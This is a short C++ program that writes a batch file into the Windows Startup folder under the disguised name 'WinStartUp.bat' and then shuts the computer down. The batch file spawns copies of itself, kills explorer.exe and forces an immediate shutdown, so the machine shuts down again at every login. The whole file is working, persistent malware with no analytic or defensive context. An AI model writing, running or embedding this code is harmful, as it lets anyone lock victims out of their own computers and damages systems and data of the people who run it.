#include <iostream>
#include <fstream>  
#include <filesystem>
#include <string>

using namespace std;
namespace fs = std::filesystem;

int main(int argc, char *argv[])
{
   auto path = std::filesystem::temp_directory_path()
    .parent_path()
    .parent_path()
    .parent_path();//find the AppData directory
   path /= "Roaming"; // set path to AppData\\Roaming
   std::filesystem::path user_path = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinStartUp.bat";
   path /= "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinStartUp.bat";
   
   //cout << path << endl;
   
   std::ofstream ofs;
  ofs.open ("test.bat", std::ofstream::out | std::ofstream::app);

  ofs << "start %0 %0\n taskkill /F /IM explorer.exe \n shutdown /s /t 1";

  ofs.close();
   try {
    std::filesystem::copy("test.bat",  path);
    std::filesystem::remove("test.bat");
  } catch (std::filesystem::filesystem_error& e) {
    std::cout << e.what() << '\n';
  }
  
   system("shutdown /s /t 1");
   return 0;
}